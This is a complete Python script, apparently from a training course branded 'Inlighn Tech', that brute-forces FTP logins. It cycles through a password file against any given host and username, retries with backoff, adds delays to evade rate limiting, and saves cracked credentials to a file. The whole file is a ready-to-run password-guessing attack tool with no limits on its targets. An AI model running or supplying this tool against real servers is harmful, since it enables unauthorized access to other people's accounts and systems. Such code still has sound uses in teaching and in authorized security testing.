

import ftplib
import sys
import time
from typing import Optional, List

class FTPBruteForcer:
    """Basic FTP brute-force implementation"""
    
    def __init__(self, host: str, username: str, password_list: List[str]):
        self.host = host
        self.username = username
        self.password_list = password_list
        self.ftp = None
        self.successful_credentials = []
        
    def attempt_login(self, password: str, retry_count: int = 2) -> bool:
        """Attempt to login with given password"""
        for attempt in range(retry_count):
            try:
                self.ftp = ftplib.FTP(self.host)
                self.ftp.login(self.username, password)
                print(f"[SUCCESS] Username: {self.username}, Password: {password}")
                self.successful_credentials.append((self.username, password))
                self.save_credentials()
                return True
                
            except ftplib.error_perm as e:
                if "530" in str(e):  # Login incorrect
                    print(f"[FAILED] Username: {self.username}, Password: {password} - Incorrect credentials")
                    return False
                else:
                    print(f"[ERROR] FTP error: {e}")
                    
            except (ConnectionRefusedError, TimeoutError, ftplib.all_errors) as e:
                print(f"[ERROR] Connection error (attempt {attempt + 1}): {e}")
                time.sleep(2 ** attempt)  # Exponential backoff
                
            finally:
                if self.ftp:
                    try:
                        self.ftp.quit()
                    except:
                        pass
                    self.ftp = None
                    
        return False
    
    def brute_force(self) -> None:
        """Execute brute-force attack"""
        print(f"\n[INFO] Starting brute-force attack on {self.host}")
        print(f"[INFO] Username: {self.username}")
        print(f"[INFO] Total passwords to test: {len(self.password_list)}\n")
        
        start_time = time.time()
        found = False
        
        for idx, password in enumerate(self.password_list, 1):
            print(f"[PROGRESS] Testing password {idx}/{len(self.password_list)}")
            
            if self.attempt_login(password):
                found = True
                break
                
            # Add delay between attempts to avoid rate limiting
            time.sleep(0.5)
        
        elapsed_time = time.time() - start_time
        
        if found:
            print(f"\n[SUCCESS] Attack completed in {elapsed_time:.2f} seconds")
            print(f"[INFO] Credentials saved to credentials.txt")
        else:
            print(f"\n[FAILED] Attack completed in {elapsed_time:.2f} seconds")
            print("[INFO] No valid credentials found")
    
    def save_credentials(self) -> None:
        """Save found credentials to file"""
        with open("credentials.txt", "a") as f:
            for username, password in self.successful_credentials:
                f.write(f"{self.host}:{username}:{password}\n")

def load_password_list(file_path: str) -> List[str]:
    """Load passwords from file"""
    try:
        with open(file_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
        return passwords
    except FileNotFoundError:
        print(f"[ERROR] Password file {file_path} not found")
        sys.exit(1)

def main():
    """Main function"""
    if len(sys.argv) != 4:
        print("Usage: python ftp_brute.py <host> <username> <password_file>")
        print("Example: python ftp_brute.py 192.168.1.100 admin passwords.txt")
        sys.exit(1)
    
    host = sys.argv[1]
    username = sys.argv[2]
    password_file = sys.argv[3]
    
    print("=" * 60)
    print("FTP Brute-Force Tool - Basic Version")
    print("By Inlighn Tech")
    print("=" * 60)
    
    passwords = load_password_list(password_file)
    
    brute_forcer = FTPBruteForcer(host, username, passwords)
    brute_forcer.brute_force()

if __name__ == "__main__":
    main()